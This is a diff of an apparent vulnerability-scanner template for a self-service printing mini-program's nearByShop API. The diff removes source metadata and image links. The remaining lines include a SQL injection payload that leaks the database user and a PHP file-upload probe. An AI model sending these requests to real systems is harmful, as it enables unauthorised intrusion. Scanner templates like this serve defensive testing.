@@ -3,12 +3,8 @@ info:
   name: 全新UI⾃助打印⼩程序系统nearByShop file存在多个漏洞
   author: hacktwo
   severity: medium
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/rkqutebrk5kr90ru'
+  description: ''
   tags: other,2025
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: rkqutebrk5kr90ru
-    fofa: '"未登录" && "/admin/login/index.html"'
 http:
 - raw:
   - 'POST /api/shop/nearByShop HTTP/1.1
@@ -39,9 +35,7 @@ http:
 
     latitude=1&longitude=GTID_SUBSET(CONCAT((MID((IFNULL(CAST(CURRENT_USER() A
 
-    S NCHAR),0x20)),1,190))),9392)
-
-    ![](https://cdn.nlark.com/yuque/0/2025/png/43110909/1740401165282-7fc8cd6d-9d7c-4c00-8e42-dc872e91fe15.png)'
+    S NCHAR),0x20)),1,190))),9392)'
   redirects: false
   matchers:
   - status:
@@ -92,9 +86,7 @@ http:
 
     <?php phpinfo();?>
 
-    ------WebKitFormBoundaryXr8AJ9qGX4nSmcI0--
-
-    ![](https://cdn.nlark.com/yuque/0/2025/png/43110909/1740401165522-d696682f-117e-491f-aa01-c61c5c3a4780.png)'
+    ------WebKitFormBoundaryXr8AJ9qGX4nSmcI0--'
   redirects: false
   matchers:
   - status:
